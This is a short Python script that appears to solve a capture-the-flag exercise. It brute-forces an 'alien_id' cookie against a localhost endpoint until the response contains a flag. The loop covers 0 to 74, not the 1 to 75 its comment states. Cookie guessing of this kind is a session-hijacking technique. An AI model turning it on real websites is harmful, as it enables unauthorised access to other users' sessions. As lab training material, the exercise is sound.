# ""Cookie Cutter""
# Write a script that can guess cookie values
# and send them to the url http://127.0.0.1:8082/cookiestore
# Read the response from the logged in cookie value to get the flag.
# The cookie name the aliens are using is alien_id
# we believe the id is a number between 1 and 75
#
# Note: The script can timeout. If this occurs try narrowing
# down your search
#
import urllib.request
#import re

url = 'http://127.0.0.1:8082/cookiestore'
num = 1

for num in range(75):
	req = urllib.request.Request(url)
	req.add_header("Cookie", "alien_id = " + str(num))
	res = urllib.request.urlopen(req)
	data = str(res.read(), 'utf-8')
	if "flag" in data:
		#patt = 'flag is: (.*) <p>'
		#data = re.findall(patt, data)[0]
		print(data)
		break
